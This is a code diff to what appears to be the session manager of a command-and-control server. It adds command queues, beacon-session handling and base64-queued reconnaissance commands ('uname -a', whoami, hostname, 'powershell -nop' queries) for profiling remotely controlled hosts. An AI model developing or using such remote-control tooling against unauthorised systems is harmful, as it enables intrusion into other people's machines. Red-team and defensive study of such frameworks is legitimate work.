@@ -4,6 +4,13 @@ import fnmatch
 import uuid
 import threading
 import signal
+from colorama import init, Fore, Style
+
+brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
+brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
+brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
+brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
+
 
 class Session:
     def __init__(self, sid, transport, handler):
@@ -12,10 +19,14 @@ class Session:
         self.handler = handler
         self.command_queue = queue.Queue()
         self.output_queue = queue.Queue()
+        self.meta_command_queue = queue.Queue()
+        self.meta_output_queue = queue.Queue()
         self.metadata = {}
         self.metadata_stage = 0
+        self.collection = 0
         #self.metadata_fields = ["hostname", "user", "os", "arch"]
         self.mode = "detect_os"
+        self.last_cmd_type = "meta"
         self.os_metadata_commands = []
         self.metadata_fields = []
 
@@ -23,7 +34,8 @@ class Session:
         self.queue_metadata_commands()
 
     def queue_metadata_commands(self):
-        self.command_queue.put(base64.b64encode(b"uname -a").decode())
+        cmd = "uname -a"
+        self.meta_command_queue.put(base64.b64encode(cmd.encode()).decode())
 
         """self.command_queue.put(base64.b64encode(b"hostname").decode())
         self.command_queue.put(base64.b64encode(b"whoami").decode())
@@ -45,12 +57,12 @@ class Session:
                 ("arch", "uname -m")
             ]
         else:
-            self.metadata["os"] = "Windows"
+            #self.metadata["os"] = "Windows"
             self.metadata_fields = ["hostname", "user", "os", "arch"]
             self.os_metadata_commands = [
                 ("hostname", "hostname"),
                 ("user", "whoami"),
-                ("os", "((cmd.exe /c ver) | Select-String -Pattern 'Windows').Matches.Value"),
+                ("os", "powershell.exe -nop -Command \"((cmd.exe /c ver) | Select-String -Pattern 'Windows').Matches.Value\""),
                 ("arch", 'powershell.exe -Command "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)"')
             ]
 
@@ -67,7 +79,7 @@ sessions = {}
 alias_map: dict[str,str] = {}
 dead_sessions: set[str] = set()
 
-def kill_http_session(sid, beacon_interval=False):
+def kill_http_session(sid, os_type, beacon_interval=False):
     """if str(sid).lower() == "all":
         # make a static list since we'll be mutating sessions
         all_sids = list(sessions.keys())
